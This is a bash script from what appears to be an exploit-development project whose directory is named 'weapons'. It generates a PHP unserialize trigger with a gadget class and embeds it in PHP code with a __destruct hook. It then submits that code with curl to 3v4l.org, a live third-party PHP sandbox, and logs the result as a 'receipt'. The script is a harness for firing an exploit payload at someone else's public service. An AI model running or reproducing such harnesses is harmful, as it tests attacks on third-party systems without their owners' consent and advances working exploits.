#!/bin/bash
# Matrix item: pwn_unserialize.py --gen-trigger output -> 3v4l.org (live,
# third-party vanilla PHP 8.5.11) with the gadget class defined in-code.
set -u
OUT=/mnt/c/Users/andre/Downloads/php2shell-zeros/weapons/receipts/live_3v4l_gentrigger.log
GEN=$(python3 /mnt/c/Users/andre/Downloads/php2shell-zeros/weapons/pwn_unserialize.py --gen-trigger --gadget-class AppCacheFlusher 2>/dev/null | head -1)
B64=$(printf '%s' "$GEN" | base64 -w0)
echo "generated trigger: ${#GEN} bytes (base64 ${#B64})" | tee "$OUT"

CODE=$(cat <<EOF
<?php
\$p = base64_decode("$B64");
class AppCacheFlusher { public function __destruct() { unserialize("i:1;"); } }
\$r = @unserialize(\$p);
echo "outer ok=", var_export(\$r !== false, true), "\n";
echo "hits recorded\n";
echo "SCRIPT-END\n";
EOF
)
resp=$(curl -s --max-time 90 -X POST 'https://3v4l.org/new' \
  -H 'Accept: application/json' \
  --form-string "code=$CODE" --form-string "version=8.5.11")
echo "== 3v4l result (vanilla PHP 8.5.11):" | tee -a "$OUT"
echo "$resp" | python3 -c '
import json, sys
d = json.load(sys.stdin)
for tab in d.get("output", []):
    print("versions:", tab.get("versions"))
    print("output  :", repr(tab.get("output"))[:400])
' | tee -a "$OUT"
